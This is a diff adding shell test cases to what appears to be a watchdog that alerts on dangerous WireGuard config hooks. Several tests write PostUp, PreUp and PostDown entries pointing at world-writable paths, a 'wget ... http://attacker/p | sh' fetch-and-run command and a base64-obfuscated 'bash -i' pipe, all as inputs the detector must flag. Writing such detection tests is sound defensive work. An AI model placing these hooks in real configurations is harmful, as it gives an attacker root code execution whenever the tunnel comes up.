@@ -149,3 +149,66 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — wireguard config inventory enumerates tunnel-event-trigger root-exec surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (PostUp under /var/tmp): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = /var/tmp/.up\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (PreUp directive — symmetric to PostUp): writable-root → alert" {
+    seed_benign
+    run_wd
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPreUp = /tmp/.preup\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (PostDown directive — symmetric to PostUp): writable-root → alert" {
+    seed_benign
+    run_wd
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostDown = /tmp/.postdown\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in PostUp): wget bootstrap → alert" {
+    seed_benign
+    run_wd
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = wget -qO- http://attacker/p | sh\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in PostUp): obfuscation → alert" {
+    seed_benign
+    run_wd
+    printf '[Interface]\nPrivateKey = Qk9HVVNLRVlfbm90X3JlYWwwMDAwMDAwMA==\nPostUp = echo YmFzaCAtaQ== | base64 -d | bash\n' > "${CONF}"
+    chmod 0600 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-wireguard -- ')
+    [ "${main_count}" = "1" ]
+}
